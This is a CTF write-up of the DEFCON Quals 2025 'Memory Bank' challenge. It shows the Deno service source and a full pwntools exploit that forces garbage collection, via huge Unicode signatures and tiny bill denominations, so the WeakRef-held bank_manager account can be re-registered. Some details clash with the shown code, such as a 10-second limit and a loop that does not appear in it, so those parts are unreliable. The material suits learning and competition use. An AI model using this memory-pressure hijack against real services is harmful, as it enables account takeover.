---
layout: post
title: "DEFCON Quals 2025 - Memory Bank CTF Challenge Writeup"
date: 2025-04-14
categories: 
  - Exploitation
tags: 
  - CTF
  - Memory Exploitation
  - Web Hacking
  - Security
  - Pentesting
  - DEFCON
---

##  Introduction

As a web hacking enthusiast, I typically focus on web-based CTF challenges. However, due to the lack of such challenges in DEFCON Quals 2025, I decided to tackle the Memory Bank challenge, which, though not strictly web-based, shared some similarities in nature.

In this white-box CTF challenge, we had full access to the application code, allowing us to understand and exploit the service directly. The objective was to bypass the system’s restrictions and access the privileged `bank_manager` account, from which we could retrieve a flag. The challenge was hosted on a remote server, and the interaction was through a custom-made ATM machine interface.

![Memory Bank Challenge](/assets/img/posts/2025-04-14-chall-header.png)

The provided Dockerfile, shell script, and the main JavaScript file (`index.js`) were crucial in understanding the underlying service.

<details>
  <summary><strong>index.js</strong></summary>

{% raw %}
```javascript
// ANSI color codes
const RESET = "\x1b[0m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const BLUE = "\x1b[34m";
const MAGENTA = "\x1b[35m";
const CYAN = "\x1b[36m";
const WHITE = "\x1b[37m";
const BRIGHT = "\x1b[1m";
const DIM = "\x1b[2m";

// ASCII Art
const ATM_ART = `
${CYAN}╔══════════════════════════════════════════════════════╗
║ ${BRIGHT}╔═╗╔╦╗╔╦╗  ╔╦╗╔═╗╔═╗╦ ╦╦╔╗╔╔═╗  ╔╦╗╔═╗╔═╗╦ ╦╦╔╗╔╔═╗${RESET}${CYAN}  ║
║ ${BRIGHT}╠═╣ ║ ║║║──║║║╠═╣║  ╠═╣║║║║║╣ ──║║║╠═╣║  ╠═╣║║║║║╣ ${RESET}${CYAN}  ║
║ ${BRIGHT}╩ ╩ ╩ ╩ ╩  ╩ ╩╩ ╩╚═╝╩ ╩╩╝╚╝╚═╝  ╩ ╩╩ ╩╚═╝╩ ╩╩╝╚╝╚═╝${RESET}${CYAN}  ║
║                                                      ║
║  ${MAGENTA}┌─────────────────────┐${CYAN}                             ║
║  ${MAGENTA}│     ${WHITE}MEMORY BANK${MAGENTA}     │${CYAN}                             ║
║  ${MAGENTA}└─────────────────────┘${CYAN}                             ║
║                                                      ║
║  ${YELLOW}┌─────┬─────┬─────┐${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}1${YELLOW}  │  ${WHITE}2${YELLOW}  │  ${WHITE}3${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}├─────┼─────┼─────┤${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}4${YELLOW}  │  ${WHITE}5${YELLOW}  │  ${WHITE}6${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}├─────┼─────┼─────┤${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}7${YELLOW}  │  ${WHITE}8${YELLOW}  │  ${WHITE}9${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}├─────┼─────┼─────┤${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}*${YELLOW}  │  ${WHITE}0${YELLOW}  │  ${WHITE}#${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}└─────┴─────┴─────┘${CYAN}                                 ║
║                                                      ║
║  ${GREEN}╔══════════════════╗${CYAN}                                ║
║  ${GREEN}║ ${WHITE}INSERT CARD HERE${GREEN} ║${CYAN}                                ║
║  ${GREEN}╚══════════════════╝${CYAN}                                ║
║                                                      ║
║  ${BLUE}┌─────────────────┐${CYAN}                                 ║
║  ${BLUE}│ ${WHITE}CASH DISPENSER${BLUE}  │${CYAN}                                 ║
║  ${BLUE}└─────────────────┘${CYAN}                                 ║
╚══════════════════════════════════════════════════════╝${RESET}`;

const MARBLE_TOP = `
${DIM}${WHITE}╔══════════════════════════════════════════════════════╗
║ ▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓   ║
║ ░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░   ║
║ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║
╚══════════════════════════════════════════════════════╝${RESET}`;

const MARBLE_BOTTOM = `
${DIM}${WHITE}╔══════════════════════════════════════════════════════╗
║ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║
║ ░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░   ║
║ ▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓   ║
╚══════════════════════════════════════════════════════╝${RESET}`;

class User {
  constructor(username) {
    this.username = username;
    this.balance = 101;
    this.signature = null;
  }
}

class Bill {
  constructor(value, signature) {
    this.value = value;
    this.serialNumber = 'SN-' + crypto.randomUUID();
    this.signature = new Uint8Array(signature.length);
    for (let i = 0; i < signature.length; i++) {
      this.signature[i] = signature.charCodeAt(i);
    }
  }
  
  toString() {
    return `${this.value} token bill (S/N: ${this.serialNumber})`;
  }
}

class UserRegistry {
  constructor() {
    this.users = [];
  }
  addUser(user) {
    this.users.push(new WeakRef(user));
  }
  getUserByUsername(username) {
    for (let user of this.users) {
      user = user.deref();
      if (!user) continue;
      if (user.username === username) {
        return user;
      }
    }
    return null;
  }
  
  *[Symbol.iterator]() {
    for (const weakRef of this.users) {
      const user = weakRef.deref();
      if (user) yield user;
    }
  }
}
const users = new UserRegistry();

function promptSync(message) {
  const buf = new Uint8Array(1024*1024);
  Deno.stdout.writeSync(new TextEncoder().encode(`${YELLOW}${message}${RESET}`));
  const n = Deno.stdin.readSync(buf);
  return new TextDecoder().decode(buf.subarray(0, n)).trim();
}

function init() {
  users.addUser(new User("bank_manager"));
}

async function main() {
  init();
  console.log(ATM_ART);
  console.log(MARBLE_TOP);
  console.log(`${BRIGHT}${CYAN}Welcome to the Memory Banking System! Loading...${RESET}`);
  console.log(MARBLE_BOTTOM);

  setTimeout(async () => {
    await user();
  }, 1000);
}

async function user() {
  
  let isLoggedIn = false;
  let currentUser = null;
  
  while (true) {
    // If not logged in, require registration
    if (!isLoggedIn) {
      console.log(`${YELLOW}You have 20 seconds to complete your transaction before the bank closes for the day.\n${RESET}`);
      
      // Register user
      while (!isLoggedIn) {
        let username = promptSync("Please register with a username (or type 'exit' to quit): ");
        if (!username) {
          console.log(`${CYAN}Thank you for using Memory Banking System!${RESET}`);
          Deno.exit(0);
        }
        
        if (username.toLowerCase() === 'exit') {
          console.log(`${CYAN}Thank you for using Memory Banking System!${RESET}`);
          Deno.exit(0);
        }

        if (username.toLowerCase() === 'random') {
          username = 'random-' + crypto.randomUUID();
        } else {
          let existingUser = users.getUserByUsername(username);
      
          if (existingUser) {
            console.log(`${MAGENTA}User already exists. Please choose another username.${RESET}`);
            continue;
          }
        }

        currentUser = new User(username);
        users.addUser(currentUser);
        if (currentUser.username === "bank_manager") {
          currentUser.balance = 100000000;
        }
        console.log(MARBLE_TOP);
        console.log(`${BRIGHT}${GREEN}Welcome, ${username}! Your starting balance is ${currentUser.balance} tokens.${RESET}`);
        console.log(MARBLE_BOTTOM);
        
        isLoggedIn = true;
      }
    }
  
    // Banking operations
    console.log("\n" + MARBLE_TOP);
    console.log(`${CYAN}${BRIGHT}Available operations:${RESET}`);
    console.log(`${CYAN}1. Check balance${RESET}`);
    console.log(`${CYAN}2. Withdraw tokens${RESET}`);
    console.log(`${CYAN}3. Set signature${RESET}`);
    console.log(`${CYAN}4. Logout${RESET}`);
    console.log(`${CYAN}5. Exit${RESET}`);
    
    // Special admin option for bank_manager
    if (currentUser.username === "bank_manager") {
      console.log(`${MAGENTA}${BRIGHT}6. Vault: Withdrawflag${RESET}`);
    }
    console.log(MARBLE_BOTTOM);
    
    const choice = promptSync("Choose an operation (1-" + (currentUser.username === "bank_manager" ? "6" : "5") + "): ");
    
    switch (choice) {
      case "1":
        console.log(`${GREEN}Your balance is ${BRIGHT}${currentUser.balance}${RESET}${GREEN} tokens.${RESET}`);
        break;
        
      case "2":
        const amount = parseInt(promptSync("Enter amount to withdraw: "));
        
        if (isNaN(amount) || amount <= 0) {
          console.log(`${MAGENTA}Invalid amount.${RESET}`);
          continue;
        }
        
        if (amount > currentUser.balance) {
          console.log(`${MAGENTA}Insufficient funds.${RESET}`);
          continue;
        }
        
        const billOptions = [1, 5, 10, 20, 50, 100];
        console.log(`${YELLOW}Available bill denominations: ${billOptions.join(", ")}${RESET}`);
        const denomStr = promptSync("Enter bill denomination: ");
        const denomination = parseFloat(denomStr);

        if (denomination <=0 || isNaN(denomination) || denomination > amount) {
          console.log(`${MAGENTA}Invalid denomination: ${denomination}${RESET}`);
          continue;
        }

        const numBills = amount / denomination;
        const bills = [];

        for (let i = 0; i < numBills; i++) {
          bills.push(new Bill(denomination, currentUser.signature || 'VOID'));
        }
        
        currentUser.balance -= amount;
        
        console.log(`${GREEN}Withdrew ${BRIGHT}${amount}${RESET}${GREEN} tokens as ${bills.length} bills of ${denomination}:${RESET}`);
        //bills.forEach(bill => console.log(`- ${bill}`));
        console.log(`${GREEN}Remaining balance: ${BRIGHT}${currentUser.balance}${RESET}${GREEN} tokens${RESET}`);
        break;
        
      case "3":
        // Set signature
        const signature = promptSync("Enter your signature (will be used on bills): ");
        currentUser.signature = signature;
        console.log(`${GREEN}Your signature has been updated${RESET}`);
        break;
        
      case "4":
        // Logout
        console.log(`${YELLOW}You have been logged out.${RESET}`);
        isLoggedIn = false;
        currentUser = null;
        break;
        
      case "5":
        // Exit
        console.log(MARBLE_TOP);
        console.log(`${CYAN}${BRIGHT}Thank you for using Memory Banking System!${RESET}`);
        console.log(MARBLE_BOTTOM);
        Deno.exit(0);
        
      case "6":
        if (currentUser.username === "bank_manager") {
          try {
            const flag = Deno.readTextFileSync("/flag");
            console.log(`${BRIGHT}${GREEN}Flag contents:${RESET}`);
            console.log(`${BRIGHT}${GREEN}${flag}${RESET}`);
          } catch (err) {
            console.log(`${MAGENTA}Error reading flag file:${RESET}`, err.message);
          }
        } else {
          console.log(`${MAGENTA}${BRIGHT}Unauthorized access attempt logged 🚨🚨🚨🚨🚨🚨${RESET}`);
        }
        break;
                    
      default:
        console.log(`${MAGENTA}Invalid option.${RESET}`);
    }
  }
}

main().catch(err => {
  console.error(`${MAGENTA}An error occurred:${RESET}`, err);
  Deno.exit(1);
});
```
{% endraw %}

</details>

<details>
  <summary><strong>Dockerfile</strong></summary>

{% raw %}
```Dockerfile
FROM denoland/deno:latest

WORKDIR /app

ADD run_challenge.sh /app/run_challenge.sh
ADD index.js /app/index.js

CMD ["/app/run_challenge.sh"]
```
{% endraw %}

</details>

<details>
  <summary><strong>run_challenge.sh</strong></summary>

{% raw %}
```bash
#!/bin/bash

ulimit -m 22400 

timeout 20s deno run --allow-read index.js

echo "⏰ 🚫 BANK IS NOW CLOSED FOR THE DAY 🚫 ⏰"
```
{% endraw %}

</details>

## Challenge Goal and Constraints

To solve this challenge, we needed to bypass restrictions on the `bank_manager` account. This user was stored using a weak reference, meaning it could be garbage collected and re-registered under memory pressure.

The challenge constraints made this tricky:
- The process was limited to **22.4MB of RAM** (`ulimit -m 22400`).
- The Deno process had a **20-second global timeout**.

Our goal was to **induce sufficient memory usage to trigger garbage collection**, causing the original `bank_manager` WeakRef to be cleaned up, and then quickly re-register it as our own before memory usage dropped. With the goal clear and constraints defined, our next step was to understand how the system manages users in memory.

## Step 1: Understanding WeakRef Behavior

Inside the code, we discovered the following structure for user registration:

```javascript
class UserRegistry {
  constructor() {
    this.users = [];
  }
  addUser(user) {
    this.users.push(new WeakRef(user));
  }
}
```

This meant that each user was stored as a [`WeakRef`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakRef) — a special type of reference in JavaScript that doesn’t prevent its target object from being garbage collected.

In practice, this has a key implication: if there are no strong references to a User object and the system experiences memory pressure, that user can be silently removed from memory by the garbage collector.

Crucially, the `bank_manager` user is added to this registry at boot time and has no strong reference held elsewhere. So, if we can force a garbage collection event by exhausting memory, the `bank_manager` may be collected and the username freed — allowing us to re-register it as our own.

Our exploit would rely on reaching that memory threshold without crashing the process.

## Step 2: Exploring the Environment

Upon inspection, we saw that the challenge was hosted using a [Deno](https://docs.deno.com/) application, and we were required to interact with it by sending commands through a remote connection. The provided Dockerfile and `run_challenge.sh` script revealed that the service was running in a restricted memory environment, with a memory limit of 22.4MB (`ulimit -m 22400`) and a 20-second timeout.

This confirmed what we already knew: exploiting memory pressure would be the only viable path to reclaiming the bank_manager account.

```bash
ulimit -m 22400  # Memory limit of 22.4MB
timeout 20s deno run --allow-read index.js  # Timeout after 20 seconds
```

With that confirmed, we started experimenting with interactions that could gradually consume memory and potentially trigger garbage collection. Creating users and setting long signatures appeared promising — especially since signatures were stored and reused during withdrawals.

## Step 3: Identifying Signature as a Key Memory Factor

After testing various methods, we discovered that the size of the signature had a significant impact on memory usage. Each character in the signature, particularly those that were large Unicode characters (such as emojis and CJK characters), contributed substantially to memory consumption. We decided to exploit this by crafting large signatures to consume as much memory as possible. This memory-intensive approach was key to our strategy to trigger the system’s memory limits.

### Creating a Large Signature

We used a combination of emojis and CJK characters (which require 4 bytes per character in UTF-8 encoding) to generate a signature that would consume a large amount of memory.

```python
def generate_heavy_signature(length=10000):
    ranges = [
        range(0x1F300, 0x1F6FF),  # Emojis
        range(0x20000, 0x2A6DF),  # CJK Ext B
        range(0x2A700, 0x2B73F),  # CJK Ext C
    ]
    pool = ''.join(chr(i) for r in ranges for i in r)
    return ''.join(random.choices(pool, k=length))
```

By generating signatures with a length of 10,000 characters, we were able to create massive signatures that consumed a substantial portion of the available memory. This was the first step towards achieving the desired memory exhaustion, but it still wasn’t enough to trigger the desired behavior.

## Step 4: Combining Signature Size with Token Withdrawals

We also realized that token withdrawals were a significant factor in increasing memory usage. Each time a user withdrew tokens, the signature was sent multiple times—once for each bill generated. By increasing the number of bills generated, we could exponentially increase memory usage. This meant that the withdrawal process could amplify memory consumption by including the large signature on multiple bills at once.

```javascript
for (const bill of bills) {
  console.log(`${bill.id}: Signed by ${user.signature}`);
}
```

### Setting the Denomination to an Extremely Low Value

Initially, we believed that reducing the denomination value would increase memory consumption and trigger the server's memory limit. The system appeared to expect integer values for denominations, as seen in the following code:

```javascript
const billOptions = [1, 5, 10, 20, 50, 100];
console.log(`${YELLOW}Available bill denominations: ${billOptions.join(", ")}${RESET}`);
```

However, we soon realized that we could use float values for the `denomination` (which wasn't initially clear from the available options), allowing us to generate a much higher number of bills per withdrawal. This was a critical insight because the smaller the denomination, the more bills the server had to process, increasing the overall memory consumption.

This became especially important because each user only had **101 tokens** by default. With such a small balance, we couldn't afford to make many withdrawals, so it was essential to **extract the maximum number of bills in a single transaction**. Using a small float denomination — like `0.00001` — let us transform a single 100-token withdrawal into **thousands of bills**, each including a full copy of the user's signature. This massively boosted memory usage per user session.

The issue we hadn’t accounted for was that using very small float values for the `denomination` also directly impacted the calculation time. The smaller the denomination, the more bills the system had to create, which led to increased processing time.

This increased the duration of each operation, eventually causing the server to exceed its 10-second execution timeout and triggering a timeout kill (`SIGKILL`) on the process.

```python
p.sendlineafter(b"withdraw", b"100")
denomination = 0.00001  # Extremely low denomination
p.sendlineafter(b"denomination", str(denomination).encode())
```

This approach worked by triggering multiple bills per transaction, each of which carried the signature. With the large signature size and the increased number of bills due to the small denomination, the service's memory usage surged.

## Step 5: Optimizing Memory Usage and Execution Time

After refining our approach, we found that on the local machine, the solution worked perfectly, and we could send enough data to exhaust the memory. However, remotely, the connection was terminated due to the timeout before the memory exhaustion could take effect.

At first, we suspected the service was terminating the process because it was exceeding the 22.4MB memory limit, triggering a `SIGKILL`. However, after additional testing, we discovered that the issue was not related to memory limits but rather the execution time. The small denomination value resulted in many bills being generated, which prolonged the calculation time. This delay caused the process to exceed the 10-second limit set by the server for calculating the `denomination` and generating the bills. It wasn’t the overall connection timeout (which was 20 seconds) that caused the issue, but the specific operation of calculating and processing the denominations, which exceeded the 10-second limit for that operation.

The server didn’t kill the process because of memory usage, but because it took too long to complete the required operations, triggering a timeout for that specific process.

![Pikachu Surprised](/assets/img/posts/2025-04-14-pikachu.png)

In Step 4, we leveraged very low denomination values (e.g., `0.00001`) to generate multiple bills per transaction, which greatly increased memory consumption. However, this also prolonged the transaction duration, causing the process to exceed the 10-second timeout. To address this, we increased the denomination to `0.001`, reducing the number of bills created per transaction and significantly lowering the processing time without sacrificing memory consumption.

## Final Solution: A Fine Balance Between Memory and Time

After considering memory consumption and the effect of denominations on execution time, we fine-tuned our approach to balance both. By adjusting the signature size to maximize memory consumption and the denomination to reduce the number of bills processed, we successfully exploited the system's memory limitations within the 10-second execution window.

This strategy was important for two reasons:
 1. Increasing the size of the signature maximized memory consumption, which was necessary for triggering memory exhaustion.
 2. By setting the denomination to `0.001`, we reduced the number of bills generated for each withdrawal. A larger denomination helped keep the process from timing out, as generating fewer bills took less time.

By combining a memory-heavy signature with a carefully chosen denomination, we triggered garbage collection and successfully re-registered `bank_manager` before the process timed out.

```python
denomination = 0.001  # Larger denomination to reduce transaction count
```

By optimizing both the signature size and the denomination, we successfully triggered the desired memory exhaustion without exceeding the execution time limits. This allowed us to access the `bank_manager` account and retrieve the flag.

![Flag](/assets/img/posts/2025-04-14-flag.png)

### Final Exploit Code

The exploit code handles three critical tasks: authentication (sending the ticket), generating the large signature to consume memory, and sending the required input for each operation to exploit the system. The `send_input` function ensures that the user interactions are automated and executed in the correct order, while the heavy signature and denomination adjustments trigger memory exhaustion without exceeding the 10-second execution time limit. This ultimately allows us to bypass the system’s restrictions and log in as `bank_manager`.

```python
from pwn import *
import random
import time
import string

HOST = "memorybank-tlc4zml47uyjm.shellweplayaga.me"
PORT = 9005
TICKET = "ticket{BigFrankie1655n25...Yq3L3j8OLx1T2q7_qkxqLauM}"

def generate_heavy_signature(length=10000):
    # Combining ranges for memory-heavy characters
    ranges = [
        range(0x1F300, 0x1F6FF),  # Emojis
        range(0x20000, 0x2A6DF),  # CJK Ext B
        range(0x2A700, 0x2B73F),  # CJK Ext C
    ]
    pool = ''.join(chr(i) for r in ranges for i in r)
    return ''.join(random.choices(pool, k=length))  # Generate random characters

def send_ticket(p):
    """ Send ticket to authenticate. """
    p.sendline(TICKET.encode())
    print("[*] Ticket sent")

def send_input(p, prompt, response):
    """ Utility function to send input after receiving prompt. """
    p.sendlineafter(prompt, response)

def exploit():
    try:
        with remote(HOST, PORT) as p:  # Using with statement to ensure closure of connection
            print("[*] Connected to server")

            send_ticket(p)  # Send ticket to authenticate

            # Generate a heavy signature
            sign = generate_heavy_signature()
            print(f"[*] Creating user")
            print(f"    Signature: {sign[:50]}...")

            # Register user and set signature
            send_input(p, b"Please register with a username", b"random")
            send_input(p, b"Choose an operation", b"3")
            send_input(p, b"Enter your signature", sign.encode())

            # Withdraw tokens with a low denomination
            send_input(p, b"operation", b"2")
            send_input(p, b"withdraw", b"100")
            send_input(p, b"denomination", str(0.001).encode())

            # Logout and attempt to register as bank_manager
            send_input(p, b"Choose an operation", b"4")
            send_input(p, b"Please register with a username", b"bank_manager")
            send_input(p, b"Choose an operation", b"6")

            p.interactive()  # Switch to interactive mode to interact with bank_manager

    except Exception as e:
        print(f"[!] Error occurred: {e}")

if __name__ == "__main__":
    exploit()
```


## Conclusion

This challenge not only required a deep understanding of memory management but also patience and experimentation with different memory manipulation techniques. By carefully adjusting the parameters, we successfully exploited the memory limitations, ultimately achieving our goal: retrieving the flag.

### Acknowledgments

Special thanks to DEFCON Quals for designing this challenge. The concept of managing memory while interacting with a service in real-time provided a unique opportunity for learning and problem-solving.

### TL;DR — Memory vs Time: A Tradeoff for Exploitation

Initially, we thought the service was killed due to memory exhaustion. In reality, the issue was execution time: using tiny denominations created too many bills, making the process slow enough to hit the 10-second timeout. By increasing the denomination just enough, we kept memory usage high while staying within the time limit — and successfully triggered garbage collection to reclaim the `bank_manager` account.